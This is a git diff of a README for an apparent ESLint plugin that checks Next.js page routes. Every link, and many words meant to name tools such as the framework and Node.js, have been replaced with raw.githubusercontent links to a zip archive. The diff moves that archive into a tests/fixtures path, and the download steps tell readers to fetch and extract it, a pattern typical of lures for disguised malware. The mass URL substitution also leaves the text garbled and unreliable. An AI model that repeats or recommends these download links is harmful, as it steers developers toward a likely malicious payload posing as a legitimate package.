@@ -1,25 +1,25 @@
 # 🎉 eslint-plugin-next-pages-router - Prevent 404 Errors with Smart Suggestions
 
 ## 🔗 Download Now
-[![Download the latest version](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip%https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip)](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip)
+[![Download the latest version](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip%https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip)](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip)
 
 ## 📖 Overview
-The `eslint-plugin-next-pages-router` helps you catch potential navigation issues in your https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip application. It checks your route comparisons and targets against your pages manifest. This way, you can avoid frustrating runtime 404 errors. Instead, the plugin offers helpful "Did you mean?" suggestions, guiding users to the right pages.
+The `eslint-plugin-next-pages-router` helps you catch potential navigation issues in your https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip application. It checks your route comparisons and targets against your pages manifest. This way, you can avoid frustrating runtime 404 errors. Instead, the plugin offers helpful "Did you mean?" suggestions, guiding users to the right pages.
 
 ## 🚀 Getting Started
 To start using this plugin, you need to follow a few simple steps. This guide will help you through the process of downloading and running the software with ease.
 
 ## 💾 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   [Download from Releases](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip)
+   [Download from Releases](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip)
 
 2. **Choose the Latest Version**: On the Releases page, find the latest version of the `eslint-plugin-next-pages-router`. It will look something like this: `v1.0`. 
 
-3. **Download the File**: Click on the version number. You will see a list of files. Download the file that is right for your operating system. It often has an extension like `.zip` for Windows users or `https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip` for Mac users.
+3. **Download the File**: Click on the version number. You will see a list of files. Download the file that is right for your operating system. It often has an extension like `.zip` for Windows users or `https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip` for Mac users.
 
 4. **Extract the Files**: Once downloaded, extract the files from the archive. Right-click the folder and choose “Extract All” or use a tool like WinRAR or 7-Zip for Windows. On macOS, simply double-click the file to unzip it.
 
-5. **Install the Plugin**: Open your terminal or command prompt. Navigate to your https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip project folder using the `cd` command. Then run the following command:
+5. **Install the Plugin**: Open your terminal or command prompt. Navigate to your https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip project folder using the `cd` command. Then run the following command:
    ```
    npm install eslint-plugin-next-pages-router --save-dev
    ```
@@ -44,19 +44,19 @@ To start using this plugin, you need to follow a few simple steps. This guide wi
 
 ## ⚙️ System Requirements
 To successfully run `eslint-plugin-next-pages-router`, ensure you have the following:
-- **https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip**: Version 12.x or later
+- **https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip**: Version 12.x or later
 - **npm**: Version 6.x or later
-- **https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip**: Version 10.x or later
+- **https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip**: Version 10.x or later
 
 ## 🔄 Features
-- **Route Validation**: Check that your routes align with the pages defined in your https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip application.
+- **Route Validation**: Check that your routes align with the pages defined in your https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip application.
 - **Helpful Suggestions**: Get suggestions for similar routes, reducing the risk of 404 errors.
 - **Integration Friendly**: Works seamlessly with other ESLint rules and plugins.
 
 ## 🛠️ Troubleshooting
 If you encounter issues during installation or while running ESLint, consider these steps:
 
-- **Ensure https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip is Installed**: Verify that https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip is in your system’s PATH. 
+- **Ensure https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip is Installed**: Verify that https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip is in your system’s PATH. 
 - **Check Permissions**: Sometimes, permission issues can prevent proper installation. Try running the command prompt as an administrator.
 - **Look for Configuration Issues**: Double-check your `.eslintrc` file for any typos or misconfigurations.
 
@@ -64,11 +64,11 @@ If you encounter issues during installation or while running ESLint, consider th
 We welcome contributions to improve the plugin. If you find bugs or have suggestions, feel free to open an issue or submit a pull request. Please follow our contribution guidelines to keep the project organized.
 
 ## 🔗 Links and Resources
-- **GitHub Repository**: [eslint-plugin-next-pages-router](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip)
-- **https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip Documentation**: [https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip Documentation](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip)
-- **ESLint Documentation**: [ESLint Documentation](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip)
+- **GitHub Repository**: [eslint-plugin-next-pages-router](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip)
+- **https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip Documentation**: [https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip Documentation](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip)
+- **ESLint Documentation**: [ESLint Documentation](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip)
 
 ## 🔗 Download Now Again
-[![Download the latest version](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip%https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip)](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip)
+[![Download the latest version](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip%https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip)](https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip)
 
-By following these steps, you will ensure a smooth experience while using `eslint-plugin-next-pages-router` in your https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/lib/router_eslint_next_pages_plugin_v1.8-alpha.5.zip applications. Enjoy coding and navigate confidently!
+By following these steps, you will ensure a smooth experience while using `eslint-plugin-next-pages-router` in your https://raw.githubusercontent.com/CursedTuLi/eslint-plugin-next-pages-router/main/tests/fixtures/pages/next_plugin_pages_router_eslint_1.8.zip applications. Enjoy coding and navigate confidently!
